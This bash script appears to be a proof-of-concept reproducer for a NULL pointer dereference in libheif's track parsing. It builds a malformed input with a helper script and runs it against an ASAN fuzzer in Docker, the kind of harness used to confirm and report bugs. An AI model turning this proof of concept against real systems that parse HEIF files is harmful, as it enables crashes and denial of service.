#!/usr/bin/env bash
# Reproduction script for libheif NULL pointer dereference in track.cc:478
# (missing iloc box in trak > meta with uri infe item)
#
# Requirements: Docker with image vulagent/libheif:latest

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
POC_INPUT="${SCRIPT_DIR}/poc_input"

if [ ! -f "${POC_INPUT}" ]; then
    echo "[-] poc_input not found at ${POC_INPUT}"
    echo "    Generating from gen_poc.py..."
    python3 "${SCRIPT_DIR}/gen_poc.py" "${POC_INPUT}"
fi

echo "[*] Running ASAN file_fuzzer against poc_input (${POC_INPUT})..."
echo "[*] Expected: SEGV at track.cc:478 in Box_iloc::read_data (NULL deref)"
echo ""

docker run --rm \
    -v "${POC_INPUT}:/tmp/poc_input:ro" \
    -e ASAN_OPTIONS="detect_leaks=0:abort_on_error=1:symbolize=1" \
    vulagent/libheif:latest \
    /out/asan/file_fuzzer /tmp/poc_input

# file_fuzzer exits non-zero on crash; the above line will print the ASAN report
# If we reach here, the crash did NOT reproduce — check libheif version.
echo ""
echo "[-] No crash detected — the vulnerability may have been patched."
